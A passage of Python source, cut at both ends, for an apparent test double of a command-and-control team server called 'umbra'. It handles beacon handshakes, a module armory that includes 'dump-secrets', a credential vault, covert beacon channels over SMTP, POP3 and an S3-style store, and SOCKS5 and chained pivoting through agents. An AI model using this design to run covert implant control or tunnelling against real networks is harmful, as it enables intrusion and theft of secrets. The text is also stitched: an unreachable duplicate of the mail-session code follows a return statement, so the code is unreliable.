            agent_keys=(agent_psk,),
            operator_keys=tuple(operators.values()),
        )
        # The route of every agent the operator gave one: the transport it
        # speaks, the order it may fall back in and the front domain.
        self.routes: Dict[str, Dict[str, Any]] = {}
        # The extension store.  The test double keeps the blobs in memory; the
        # Go server keeps them on disk and verifies their signature.
        self.armory: Dict[str, Dict[str, Any]] = {}
        # The server-side file store.  Like the armory, the test double keeps
        # the blobs in memory; the Go server writes them under their digest.
        self.artifacts: Dict[str, Dict[str, Any]] = {}
        # The chunked uploads that have not been closed yet.
        self.artifact_uploads: Dict[str, bytearray] = {}
        # The command namespace: saved commands the team shares.
        self.aliases: Dict[str, Dict[str, Any]] = {}
        # The credential vault of the engagement.  The Go server keeps the
        # values encrypted when a key is configured; the test double keeps
        # them in the clear, because the tests need to see them.
        self.credentials: List[Dict[str, Any]] = []
        self._install_default_armory()
        self._install_default_aliases()
        self.sleep = 5
        self.jitter = 20

    def _install_default_armory(self) -> None:
        """Register the modules the test double knows about.

        Every module carries a full manifest: the magic, the ABI number, the
        argument schema, the output schema and the capabilities it needs from
        the host.  The server refuses to push a module to an agent that lacks
        one of them, and the test double does the same, so the two agree on
        what a module is allowed to do.
        """
        modules = (
            {
                "name": "whoami",
                "version": "1.2.0",
                "description": "print the token of the current user",
                "format": "coff",
                "caps": ["shell"],
                "args": [
                    {"name": "domain", "type": "string", "required": False,
                     "help": "the domain to report"},
                ],
                "output": {"type": "text", "description": "the account name"},
                "requires": [],
            },
            {
                "name": "lsecrets",
                "version": "1.0.0",
                "description": "list the secrets of the machine",
                "format": "coff",
                "caps": [],
                "args": [],
                "output": {"type": "json", "description": "the secrets found"},
                "requires": [],
            },
            {
                "name": "dump-secrets",
                "version": "2.0.0",
                "description": "dump the secrets, with the reader it needs",
                "format": "coff",
                "caps": ["shell"],
                "args": [
                    {"name": "path", "type": "string", "required": True,
                     "help": "where to look"},
                ],
                "output": {"type": "json", "description": "the secrets found"},
                "requires": ["lsecrets"],
            },
            {
                "name": "wmi-probe",
                "version": "1.0.0",
                "description": "ask the host about its own instruments",
                "format": "coff",
                # The test double does not have this capability, so the
                # server must refuse to push the module to it.
                "caps": ["wmi.instrument"],
                "args": [],
                "output": {"type": "text", "description": "the instruments"},
                "requires": [],
            },
        )
        for module in modules:
            blob = f"UMBRA-MODULE:{module['name']}".encode()
            entry = dict(module)
            entry["magic"] = MODULE_MAGIC
            entry["abi"] = MODULE_ABI
            entry["sha256"] = hashlib.sha256(blob).hexdigest()
            entry["size"] = len(blob)
            entry["data"] = blob
            self.armory[module["name"]] = entry

    def agent_caps(self, agent_id: str) -> List[str]:
        """The capabilities an agent advertised in its handshake.

        An agent that says nothing is allowed everything: the list did not
        exist before a certain version of the framework, and refusing every
        module on such an agent would break every old beacon at once.
        """
        with self._lock:
            record = self.agents.get(agent_id) or {}
        return list(record.get("caps") or [])

    def _install_default_aliases(self) -> None:
        """Register the saved commands the test double knows about."""
        self.aliases["whoami"] = {
            "name": "whoami",
            "kind": "ext",
            "extension": "whoami",
            "args": {},
            "args_spec": ["domain"],
            "description": "who am i, with the token of the current user",
            "by": "mock",
            "created": _now(),
        }
        self.aliases["ls"] = {
            "name": "ls",
            "kind": "ls",
            "extension": "",
            "args": {"path": "."},
            "args_spec": ["path"],
            "description": "list a directory",
            "by": "mock",
            "created": _now(),
        }
        # The built-in templates of the real server, so a console that works
        # against the test double works against the team server.
        for name, kind, args, spec, description in (
            ("hostname", "exec", {"cmd": "hostname"}, [], "the name of the host"),
            ("system", "sysinfo", {}, [], "the system information of the host"),
            ("processes", "ps", {}, [], "the running processes"),
            ("network", "netinfo", {}, [], "the interfaces, the routes and the neighbours"),
            ("screenshot", "screenshot", {}, [], "a picture of the desktop"),
            ("listening", "exec",
             {"cmd": "ss -tulpn 2>/dev/null || netstat -anb 2>/dev/null"}, [],
             "the listening sockets"),
            ("routes", "exec",
             {"cmd": "ip route 2>/dev/null || route print 2>/dev/null"}, [],
             "the routing table"),
            ("services", "exec",
             {"cmd": "systemctl list-units --type=service --state=running 2>/dev/null"},
             [], "the running services"),
            ("triage", "triage", {}, ["path"],
             "the hash, the entropy and the file type of a file"),
            ("find", "find", {}, ["name", "path", "content"],
             "a search by name or by content"),
        ):
            self.aliases[name] = {
                "name": name,
                "kind": kind,
                "extension": "",
                "args": dict(args),
                "args_spec": list(spec),
                "description": description,
                "by": "mock",
                "created": _now(),
            }

    # -- lifecycle -------------------------------------------------------
    def start(self) -> Tuple[str, int]:
        if self.tls_cert and self.tls_key:
            self._tls_ctx = self._build_tls_context()
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self.host, self.port))
        self._sock.listen(32)
        self._sock.settimeout(0.2)
        self.host, self.port = self._sock.getsockname()
        ticker = threading.Thread(target=self._schedule_loop, name="mock-schedule", daemon=True)
        ticker.start()
        self._threads.append(ticker)

        t = threading.Thread(target=self._accept_loop, name="mock-accept", daemon=True)
        t.start()
        self._threads.append(t)

        # The layer-3 tunnel: a socket of its own, so it keeps working
        # when the beaconing channel is blocked.
        self.vpn.start()

        # The mail transport: the SMTP listener and the POP3 listener.
        self._mail_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._mail_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._mail_sock.bind((self.host, 0))
        self._mail_sock.listen(16)
        self._mail_sock.settimeout(0.2)
        mail_host, mail_port = self._mail_sock.getsockname()
        self.mail_addr = f"{mail_host}:{mail_port}"
        mail = threading.Thread(target=self._accept_mail, name="mock-mail", daemon=True)
        mail.start()
        self._threads.append(mail)

        self._pop3_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._pop3_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._pop3_sock.bind((self.host, 0))
        self._pop3_sock.listen(16)
        self._pop3_sock.settimeout(0.2)
        pop3_host, pop3_port = self._pop3_sock.getsockname()
        self.pop3_addr = f"{pop3_host}:{pop3_port}"
        pop3 = threading.Thread(target=self._accept_pop3, name="mock-pop3", daemon=True)
        pop3.start()
        self._threads.append(pop3)

        # The object transport: one HTTP listener for both buckets.
        self._s3_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._s3_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._s3_sock.bind((self.host, 0))
        self._s3_sock.listen(16)
        self._s3_sock.settimeout(0.2)
        s3_host, s3_port = self._s3_sock.getsockname()
        self.s3_addr = f"{s3_host}:{s3_port}"
        objects = threading.Thread(target=self._accept_objects, name="mock-s3", daemon=True)
        objects.start()
        self._threads.append(objects)
        return self.host, self.port

    def stop(self) -> None:
        self._stop.set()
        self.vpn.stop()
        for sock in (self._sock, self._mail_sock, self._pop3_sock, self._s3_sock):
            if not sock:
                continue
            try:
                sock.close()
            except OSError:
                pass
        for t in self._threads:
            t.join(timeout=1.0)

    def __enter__(self) -> "MockServer":
        self.start()
        return self

    def __exit__(self, *exc: Any) -> None:
        self.stop()

    @property
    def address(self) -> str:
        return f"{self.host}:{self.port}"

    # -- accept / dispatch ----------------------------------------------
    def _build_tls_context(self) -> ssl.SSLContext:
        """Build the server side of the mutual TLS listener.

        The Go server requires a client certificate when a client CA is
        configured; the test double does the same, so a console that works
        here works there.
        """
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_3
        ctx.load_cert_chain(self.tls_cert, self.tls_key)
        if self.tls_client_ca:
            ctx.load_verify_locations(self.tls_client_ca)
            ctx.verify_mode = ssl.CERT_REQUIRED
        return ctx

    def _client_certificate_is_welcome(self, conn: ssl.SSLSocket) -> bool:
        """Whether the client certificate is the one the operator pinned.

        The chain is proved by the TLS stack; this says which certificate
        of that chain is welcome.  The comparison of the pin is constant
        time, because the moment a peer is refused says something about
        the pin.
        """
        if not self.tls_client_cn and not self.tls_client_spki:
            return True
        try:
            der = conn.getpeercert(binary_form=True)
        except (OSError, ValueError):
            return False
        if not der:
            return False
        try:
            from cryptography import x509
            from cryptography.hazmat.primitives import serialization
        except ImportError:  # pragma: no cover - the package is required
            return True
        try:
            cert = x509.load_der_x509_certificate(der)
        except ValueError:
            return False
        if self.tls_client_cn:
            names = [attr.value for attr in cert.subject]
            if self.tls_client_cn not in names:
                return False
        if self.tls_client_spki:
            key = cert.public_key().public_bytes(
                encoding=serialization.Encoding.DER,
                format=serialization.PublicFormat.SubjectPublicKeyInfo,
            )
            digest = hashlib.sha256(key).hexdigest()
            matched = False
            for pin in self.tls_client_spki:
                if hmac.compare_digest(digest, pin):
                    matched = True
            if not matched:
                return False
        return True

    def _accept_loop(self) -> None:
        assert self._sock is not None
        while not self._stop.is_set():
            try:
                conn, addr = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            if self._tls_ctx is not None:
                try:
                    # The handshake gets its own budget: a peer that opens a
                    # connection and says nothing must not hold the listener.
                    conn.settimeout(15)
                    conn = self._tls_ctx.wrap_socket(conn, server_side=True)
                except (ssl.SSLError, OSError):
                    # A peer that fails the TLS handshake is not a session.
                    try:
                        conn.close()
                    except OSError:
                        pass
                    continue
                if not self._client_certificate_is_welcome(conn):
                    # The certificate is signed by the client CA but it
                    # is not the certificate the operator pinned.
                    try:
                        conn.close()
                    except OSError:
                        pass
                    continue
            t = threading.Thread(target=self._serve, args=(conn, addr), daemon=True)
            t.start()
            self._threads.append(t)

    # -- the batch transports --------------------------------------------

    def _accept_mail(self) -> None:
        """Wait for the mail and the mailbox connections."""
        assert self._mail_sock is not None
        while not self._stop.is_set():
            try:
                conn, addr = self._mail_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            t = threading.Thread(target=self._serve_mail, args=(conn, addr), daemon=True)
            t.start()
            self._threads.append(t)

    def _accept_pop3(self) -> None:
        """Wait for the mailbox connections."""
        assert self._pop3_sock is not None
        while not self._stop.is_set():
            try:
                conn, addr = self._pop3_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            t = threading.Thread(target=self._serve_pop3_conn, args=(conn,), daemon=True)
            t.start()
            self._threads.append(t)

    def _serve_pop3_conn(self, conn: socket.socket) -> None:
        """One mailbox session."""
        try:
            conn.settimeout(60)
            self._serve_pop3(conn, conn.makefile("rb"))
        except (OSError, ValueError):
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass

    def _accept_objects(self) -> None:
        """Wait for the object store requests."""
        assert self._s3_sock is not None
        while not self._stop.is_set():
            try:
                conn, addr = self._s3_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            t = threading.Thread(target=self._serve_object, args=(conn, addr), daemon=True)
            t.start()
            self._threads.append(t)

    def _mail_secret(self, agent_id: str) -> str:
        """The password of an agent on the mail and the object transport."""
        return batch_transports.agent_secret(self.agent_psk, agent_id)

        try:
            conn.settimeout(60)
            self._serve_smtp(conn, conn.makefile("rb"))
        except (OSError, ValueError):
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass
    def _serve_mail(self, conn: socket.socket, addr: Tuple[str, int]) -> None:
        """One session of the mail transport.

        The first line of a POP3 session says which mailbox the client
        wants; an SMTP session is the other way round.  The port tells the
        two apart, and the client is the one that opens the connection.
        """
        try:
            conn.settimeout(60)
            self._serve_smtp(conn, conn.makefile("rb"))
        except (OSError, ValueError):
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass

    def _serve_smtp(self, conn: socket.socket, reader: Any) -> None:
        """One SMTP session: the beacon mails its frames in."""
        conn.sendall(b"220 umbra.local ESMTP umbra\r\n")
        agent_id = ""
        while not self._stop.is_set():
            line = reader.readline()
            if not line:
                return
            text = line.decode("latin-1").strip()
            verb = text.split(" ", 1)[0].upper()
            if verb == "EHLO":
                conn.sendall(b"250-umbra.local greets the beacon\r\n")
                conn.sendall(b"250-AUTH PLAIN\r\n")
                conn.sendall(b"250 8BITMIME\r\n")
            elif verb == "HELO":
                conn.sendall(b"250 umbra.local\r\n")
            elif verb == "AUTH":
                payload = text.split(" ", 2)[2].strip() if len(text.split(" ", 2)) > 2 else ""
                if not payload:
                    conn.sendall(b"334 \r\n")
                    challenge = reader.readline()
                    payload = challenge.decode("latin-1").strip() if challenge else ""
                name = self._check_auth(payload)
                if name is None:
                    conn.sendall(b"535 authentication failed\r\n")
                    continue
                agent_id = name
                conn.sendall(f"235 authenticated as {agent_id}\r\n".encode())
            elif verb in ("MAIL", "RCPT"):
                conn.sendall(b"250 ok\r\n")
            elif verb == "DATA":
                if not agent_id:
                    conn.sendall(b"530 authentication required\r\n")
                    continue
                conn.sendall(b"354 end the data with <CRLF>.<CRLF>\r\n")
                body = self._read_dot_stuffed(reader)
                try:
                    frames = batch_transports.decode_body(
                        batch_transports.split_message(body)
                    )
                except Exception:
                    conn.sendall(b"554 the body is not a frame batch\r\n")
                    continue
                answer = self.handle_batch(agent_id, "smtp", frames)
                if answer:
                    with self._lock:
                        self.mailboxes.setdefault(agent_id, []).append(answer)
                conn.sendall(b"250 message accepted\r\n")
            elif verb in ("RSET", "NOOP"):
                conn.sendall(b"250 ok\r\n")
            elif verb == "QUIT":
                conn.sendall(b"221 bye\r\n")
                return
            else:
                conn.sendall(b"502 command not implemented\r\n")

    def _check_auth(self, payload: str) -> Optional[str]:
        """Check the AUTH PLAIN payload of a session."""
        try:
            raw = base64.b64decode(payload.strip())
        except Exception:
            return None
        parts = raw.split(b"\x00")
        if len(parts) != 3:
            return None
        user = parts[1].decode("latin-1", "replace")
        password = parts[2].decode("latin-1", "replace")
        if not user or not hmac.compare_digest(self._mail_secret(user), password):
            return None
        return user

    def _read_dot_stuffed(self, reader: Any) -> bytes:
        """Read the body of a mail: it ends with a line that holds a dot."""
        body = bytearray()
        while True:
            line = reader.readline()
            if not line:
                return bytes(body)
            text = line.rstrip(b"\r\n")
            if text == b".":
                return bytes(body)
            if text.startswith(b".."):
                text = text[1:]
            body += text + b"\r\n"

    def _serve_pop3(self, conn: socket.socket, reader: Any) -> None:
        """One POP3 session: the beacon picks its answer up."""
        conn.sendall(b"+OK umbra POP3 ready\r\n")
        agent_id = ""
        authed = False
        deleted: List[int] = []
        while not self._stop.is_set():
            line = reader.readline()
            if not line:
                return
            text = line.decode("latin-1").strip()
            verb = text.split(" ", 1)[0].upper()
            argument = text[len(verb) :].strip()
            if verb == "USER":
                agent_id = argument
                conn.sendall(b"+OK send the password\r\n")
            elif verb == "PASS":
                if not agent_id or not hmac.compare_digest(
                    self._mail_secret(agent_id), argument
                ):
                    agent_id = ""
                    conn.sendall(b"-ERR authentication failed\r\n")
                    continue
                authed = True
                conn.sendall(b"+OK the mailbox is ready\r\n")
            elif not authed:
                conn.sendall(b"-ERR authenticate first\r\n")
            elif verb == "STAT":
                with self._lock:
                    messages = list(self.mailboxes.get(agent_id, []))
                conn.sendall(f"+OK {len(messages)} {sum(len(m) for m in messages)}\r\n".encode())
            elif verb == "LIST":
                with self._lock:
                    messages = list(self.mailboxes.get(agent_id, []))
                conn.sendall(f"+OK {len(messages)} messages\r\n".encode())
                for index, message in enumerate(messages, 1):
                    conn.sendall(f"{index} {len(message)}\r\n".encode())
                conn.sendall(b".\r\n")
            elif verb == "RETR":
                index = int(argument or "0")
                with self._lock:
                    messages = list(self.mailboxes.get(agent_id, []))
                if index < 1 or index > len(messages):
                    conn.sendall(b"-ERR no such message\r\n")
                    continue
                body = self._mail_body(agent_id, messages[index - 1])
                conn.sendall(f"+OK {len(body)} octets\r\n".encode())
                conn.sendall(body + b"\r\n.\r\n")
            elif verb == "DELE":
                deleted.append(int(argument or "0"))
                conn.sendall(b"+OK message deleted\r\n")
            elif verb == "NOOP":
                conn.sendall(b"+OK\r\n")
            elif verb == "QUIT":
                with self._lock:
                    kept = [
                        message
                        for number, message in enumerate(self.mailboxes.get(agent_id, []), 1)
                        if number not in deleted
                    ]
                    self.mailboxes[agent_id] = kept
                conn.sendall(b"+OK bye\r\n")
                return
            else:
                conn.sendall(b"-ERR command not implemented\r\n")

    def _mail_body(self, agent_id: str, frames: bytes) -> bytes:
        """Render the frames of a batch as a mail."""
        body = batch_transports.encode_body(frames)
        return (
            f"From: umbra@umbra.local\r\n"
            f"To: {agent_id}@umbra.local\r\n"
            f"Subject: umbra {len(frames)} bytes\r\n"
            "Content-Transfer-Encoding: base64\r\n"
            "\r\n" + body + "\r\n"
        ).encode()

    def _serve_object(self, conn: socket.socket, addr: Tuple[str, int]) -> None:
        """One request of the object store."""
        try:
            conn.settimeout(60)
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = conn.recv(4096)
                if not chunk:
                    return
                data += chunk
            head, _, rest = data.partition(b"\r\n\r\n")
            lines = head.decode("latin-1").split("\r\n")
            parts = lines[0].split(" ")
            if len(parts) < 2:
                return
            method, target = parts[0].upper(), parts[1]
            headers: Dict[str, str] = {}
            for line in lines[1:]:
                if ":" in line:
                    name, _, value = line.partition(":")
                    headers[name.strip().lower()] = value.strip()
            length = int(headers.get("content-length", "0") or 0)
            body = rest
            while len(body) < length:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                body += chunk
            path, _, query = target.partition("?")
            agent_id = batch_transports.verify_request(
                method, path, query, headers, body, self._mail_secret
            )
            if agent_id is None:
                conn.sendall(b"HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\n\r\n")
                return
            bucket, _, key = path.lstrip("/").partition("/")
            if method == "PUT":
                if bucket != batch_transports.RESULTS_BUCKET:
                    conn.sendall(b"HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\n\r\n")
                    return
                answer = self.handle_batch(agent_id, "s3", body)
                with self._lock:
                    if answer:
                        self.objects.setdefault(batch_transports.TASKS_BUCKET, {})[
                            agent_id
                        ] = answer
                    else:
                        self.objects.get(batch_transports.TASKS_BUCKET, {}).pop(agent_id, None)
                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
                return
            if method == "GET":
                if bucket != batch_transports.TASKS_BUCKET:
                    conn.sendall(b"HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\n\r\n")
                    return
                with self._lock:
                    object_bytes = self.objects.get(bucket, {}).get(key)
                if object_bytes is None:
                    conn.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
                    return
                conn.sendall(
                    b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n"
                    + f"Content-Length: {len(object_bytes)}\r\n\r\n".encode()
                    + object_bytes
                )
                return
            conn.sendall(b"HTTP/1.1 405 Method Not Allowed\r\nContent-Length: 0\r\n\r\n")
        except (OSError, ValueError):
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass

    def handle_batch(self, agent_id: str, transport: str, data: bytes) -> bytes:
        """Feed a batch of frames into the session of an agent.

        The first batch carries the HELLO, the handshake runs over it, and
        the session it creates is kept for the batches that follow.
        """
        with self._lock:
            state = self.batch_sessions.get(agent_id)
        # A batch that starts with a HELLO begins a new session: the
        # beacon starts every cycle with a fresh handshake, and a batch
        # transport has no connection that would tell the two apart.
        if data and len(data) >= wire.PRELUDE_LEN and data[4] == wire.MsgType.HELLO:
            with self._lock:
                self.batch_sessions.pop(agent_id, None)
            state = None
        if state is None:
            stream = batch_transports.BufferStream(data)
            try:
                result = handshake.server_handshake(
                    stream,
                    keyring=self._keyring(),
                    cfg={"sleep": self.sleep, "jitter": self.jitter, "obf": True},
                    limits=self._queue_limits(),
                )
            except (handshake.HandshakeError, netio.StreamError, OSError, ValueError):
                return b""
            state = {
                "sess": result.session,
                "peer_id": result.peer_id,
                "meta": result.meta,
            }
            with self._lock:
                self.batch_sessions[agent_id] = state
            self._register_agent(result.peer_id, result.meta, f"{transport}:{agent_id}",
                                 caps=list(result.caps), version=result.version,
                                 implant_version=result.implant_version, abi=result.abi)
            rest = stream
        else:
            rest = batch_transports.BufferStream(data)
        sess = state["sess"]
        peer_id = state["peer_id"]
        try:
            while True:
                raw = rest.recv_frame()
                msg_type, msg = sess.decrypt_message(raw)
                if not self._agent_frame(rest, sess, peer_id, msg_type, msg):
                    break
        except (netio.StreamError, session.SessionError, ValueError):
            pass
        return bytes(rest.out)

    def _queue_limits(self) -> Dict[str, Any]:
        """The limits of the queue, as the server tells them to a beacon."""
        return {
            "max_in_flight_per_agent": 4,
            "max_deliver_per_minute_per_agent": 60,
            "max_deliver_per_second": 200,
            "max_attempts": MAX_ATTEMPTS,
        }

    def _keyring(self) -> List[handshake.KeyringEntry]:
        ring = [handshake.KeyringEntry("agent", self.agent_psk, crypto.ROLE_AGENT)]
        # The keys that are bound to one agent id come first: a beacon
        # with its own key is served by it, and the fleet key is the
        # fallback for the beacons that were built before them.
        for agent_id in sorted(self.agent_keys):
            ring.append(
                handshake.KeyringEntry(
                    f"agent:{agent_id}", self.agent_keys[agent_id],
                    crypto.ROLE_AGENT, bound_id=agent_id,
                )
            )
        # The previous agent key still works while the fleet catches up.
        if self.previous_agent_psk and self.previous_agent_until > time.time():
            ring.append(
                handshake.KeyringEntry("agent", self.previous_agent_psk, crypto.ROLE_AGENT)
            )
        for name, token in self.operators.items():
            ring.append(handshake.KeyringEntry(name, token, crypto.ROLE_OPERATOR))
        # And the previous operator tokens work for the overlap.
        for name, (token, until) in self.previous_operators.items():
            if until > time.time():
                ring.append(handshake.KeyringEntry(name, token, crypto.ROLE_OPERATOR))
        return ring

    def rotate_agent_psk(self, psk: Optional[str] = None) -> str:
        """Replace the agent PSK; the old one keeps working for the overlap.

        The new key is a *text*, hex encoded, exactly like the Go server:
        the operator copies it into the configuration of the beacons, so it
        has to be typeable and it has to be the same bytes the server uses.
        """
        fresh = psk or secrets.token_hex(32)
        if len(fresh) < 16:
            raise ValueError("the agent PSK must be at least 16 characters")
        self.previous_agent_psk = self.agent_psk
        self.previous_agent_until = time.time() + self.key_overlap
        # The key is kept as the bytes the protocol uses; the operator sees
        # it as hex, because that is what the beacons read.
        self.agent_psk = decode_psk(fresh)
        return fresh

    def rotate_token(self, name: str, role: Optional[str] = None,
                     scopes: Optional[List[str]] = None,
                     expires: Optional[float] = None,
                     token: Optional[str] = None) -> str:
        """Replace the token of one operator and narrow its scopes.

        The old token keeps working for the overlap whether the new one is
        generated or brought by the operator: a rotation is a rotation.  An
        operator that does not exist yet is created, so a new analyst can
        be given a token without restarting the server.
        """
        fresh = token or secrets.token_hex(32)
        if name in self.operators:
            self.previous_operators[name] = (self.operators[name],
                                             time.time() + self.key_overlap)
        self.operators[name] = fresh.encode()
        if role:
            self.roles[name] = role
        else:
            self.roles.setdefault(name, "operator")
        self.token_scopes[name] = list(scopes or [])
        self.token_expires[name] = float(expires or 0.0)
        self.token_rotated[name] = time.time()
        return fresh

    def token_state(self) -> List[Dict[str, Any]]:
        """The state of every operator token: no token itself, only its shape."""
        now = time.time()
        rows: List[Dict[str, Any]] = []
        for name in sorted(self.operators):
            expires = self.token_expires.get(name, 0.0)
            rows.append(
                {
                    "operator": name,
                    "role": self.roles.get(name, "operator"),
                    "scopes": list(self.token_scopes.get(name, [])),
                    "expires": int(expires),
                    "expired": bool(expires and now > expires),
                    "last_used": int(self.token_last_used.get(name, 0.0)),
                    "rotated": int(self.token_rotated.get(name, 0.0)),
                }
            )
        return rows

    def _serve(self, conn: socket.socket, addr: Tuple[str, int]) -> None:
        if self.websocket:
            # The WebSocket transport: the opening handshake comes first, then
            # every umbra frame travels in a binary WebSocket frame.  A peer
            # that does not ask for an upgrade (the operator console) is
            # served the plain protocol, exactly like the Go server does.
            head, leftover = _peek_first(conn, 4)
            if head.startswith(b"GET "):
                if isinstance(conn, ssl.SSLSocket):
                    # The TLS handshake had its own budget; the session may
                    # wait as long as it wants.
                    conn.settimeout(None)
                server = ws.WebSocketServer(conn, pending=leftover)
                try:
                    if not server.handshake():
                        server.close()
                        return
                except (OSError, ws.WebSocketError):
                    return
                stream = ws.WebSocketStream(server)
            else:
                stream = netio.Stream(conn, timeout=30)
                # The bytes the look at the connection took are put back in
                # front of the stream: nothing is lost.
                stream.push_back(leftover)
        else:
            stream = netio.Stream(conn, timeout=30)
        # The operator is subscribed before the handshake answer goes out:
        # the console believes it is connected as soon as the HELLO_ACK
        # arrives, so an event emitted in the same breath has to find a
        # subscriber already.
        operator_box: Dict[str, Any] = {}

        def on_peer(peer_id: str, role: int, meta: dict) -> None:
            if peer_id not in self.operators:
                return
            # The last use of a token is the last time it authenticated.
            self.token_last_used[peer_id] = time.time()
            inbox: "queue.Queue[Dict[str, Any]]" = queue.Queue(maxsize=512)
            with self._lock:
                self.subscribers.append((peer_id, inbox))
                self.op_sessions[peer_id] = {
                    "name": peer_id,
                    "role": self.roles.get(peer_id, "operator"),
                    "peer": str(addr),
                    "transport": "tcp/operator",
                    "since": _now(),
                    "focus": "",
                    "focus_at": "",
                    "last_seen": time.time(),
                }
            operator_box["inbox"] = inbox
            operator_box["peer"] = peer_id
            self.emit("operator.connected", peer_id)

        try:
            result = handshake.server_handshake(
                stream, keyring=self._keyring(),
                cfg={"sleep": self.sleep, "jitter": self.jitter, "obf": True},
                on_peer=on_peer,
                limits=self._queue_limits(),
            )
        except (handshake.HandshakeError, netio.StreamError, OSError):
            self._drop_operator(operator_box)
            stream.close()
            return

        try:
            if result.peer_id in self.operators:
                self._operator_loop(stream, result, str(addr), operator_box.get("inbox"))
            elif result.meta.get("tunnel"):
                # A callback session: the agent dialled back to serve a pivot.
                self._tunnel_loop(stream, result)
            else:
                self._agent_loop(stream, result, str(addr))
        except (netio.StreamError, ws.WebSocketError, OSError):
            # The peer went away in the middle of the session: that is a
            # normal end, not a failure of the server.
            self._drop_operator(operator_box)

    def _drop_operator(self, operator_box: Dict[str, Any]) -> None:
        """Take an operator off the subscriber list again.

        Used when the handshake fails after the operator was subscribed: the
        subscription lives in the box, the session in the hub.
        """
        inbox = operator_box.get("inbox")
        if inbox is None:
            return
        with self._lock:
            self.subscribers = [(n, q) for (n, q) in self.subscribers if q is not inbox]
            self.op_sessions.pop(str(operator_box.get("peer", "")), None)
        operator_box["inbox"] = None

    # -- pivoting -------------------------------------------------------
    def _tunnel_loop(self, stream: netio.Stream, result: handshake.HandshakeResult) -> None:
        """Serve one agent callback connection."""
        agent_id = result.peer_id
        sid = str(result.meta.get("tunnel", ""))
        ts = TunnelSession(self, agent_id, sid, stream, result.session)
        with self._lock:
            self.tunnel_sessions[agent_id] = ts
            pending = self.pending_tunnels.pop(agent_id, None)
        if pending is not None and pending[0] == sid:
            pending[1].set()
        self.emit("pivot.session_open", agent_id, data={"session": sid})
        try:
            ts.read_loop()
        finally:
            ts.close()

    def _tunnel_session(self, agent_id: str, timeout: float = 30.0) -> TunnelSession:
        """Return the callback session of an agent, asking for one if needed."""
        with self._lock:
            ts = self.tunnel_sessions.get(agent_id)
        if ts is not None and ts.ready.is_set() and not ts.done.is_set():
            return ts
        sid = new_id("sid")
        event = threading.Event()
        with self._lock:
            self.pending_tunnels[agent_id] = (sid, event)
        task = {
            "id": new_id("t"),
            "agent_id": agent_id,
            "kind": "tunnel",
            "args": {"stream": sid},
            "state": "queued",
            "code": 0,
            "out": b"",
            "err": "",
            "created": _now(),
        }
        with self._lock:
            self.tasks[task["id"]] = task
        if not event.wait(timeout):
            with self._lock:
                self.pending_tunnels.pop(agent_id, None)
            raise RuntimeError("the agent did not open a tunnel session in time")
        with self._lock:
            ts = self.tunnel_sessions.get(agent_id)
        if ts is None:
            raise RuntimeError("the agent opened an unknown tunnel session")
        return ts

    def _pivot_accept(
        self,
        listener: socket.socket,
        mode: str,
        host: str,
        port: int,
        tunnel_id: str,
        agent_id: str,
        user: str = "",
        password: str = "",
        dns: str = "remote",
        deny: Optional[List[str]] = None,
        path: Optional[List[str]] = None,
    ) -> None:
        while not self._stop.is_set():
            try:
                conn, _ = listener.accept()
            except OSError:
                return
            # The session is taken per connection: when the agent
            # re-connects, the next connection gets the new session.
            try:
                ts = self._tunnel_session(agent_id)
            except RuntimeError:
                return
            t = threading.Thread(
                target=self._pivot_handle,
                args=(conn, ts, mode, host, port, tunnel_id, agent_id,
                      user, password, dns, deny, list(path or [])),
                daemon=True,
            )
            t.start()

    def _pivot_handle(
        self,
        conn: socket.socket,
        ts: TunnelSession,
        mode: str,
        host: str,
        port: int,
        tunnel_id: str,
        agent_id: str,
        user: str = "",
        password: str = "",
        dns: str = "remote",
        deny: Optional[List[str]] = None,
        path: Optional[List[str]] = None,
    ) -> None:
        """Turn one local connection into a stream through the agent."""
        client = ""
        try:
            client = _peer_name(conn)
        except OSError:
            client = ""
        target_host, target_port = host, port
        counter = {"up": 0, "down": 0}
        state = "closed"
        # The address of the listener: the SOCKS5 answer carries it, and
        # its family is the family of the listener.
        listen_host = ""
        try:
            listen_host = _local_name(conn)
        except OSError:
            listen_host = ""
        try:
            if mode == "forward":
                target_host, target_port = host, port
            else:
                target_host, target_port = socks5_connect(conn, user, password)
                if not target_host:
                    return
            if dns == "local" and not _is_ip(target_host):
                try:
                    target_host = socket.gethostbyname(target_host)
                except OSError:
                    pass
            if _denied(deny or [], target_host, target_port):
                self._pivot_note(client, target_host, target_port, 0, 0, "denied")
                if mode == "socks":
                    try:
                        # 0x02 is "not allowed by ruleset".
                        conn.sendall(_socks5_reply(0x02, listen_host))
                    except OSError:
                        pass
                return
            try:
                if path:
                    # A chained pivot: every further hop is reached
                    # through the peer link of the previous one.
                    opener, st = self._pivot_open_chain(
                        agent_id, list(path), target_host, target_port
                    )
                else:
                    opener = ts
                    st = ts.open_stream(target_host, target_port)
            except RuntimeError:
                self._pivot_note(client, target_host, target_port, 0, 0, "refused")
                if mode == "socks":
                    try:
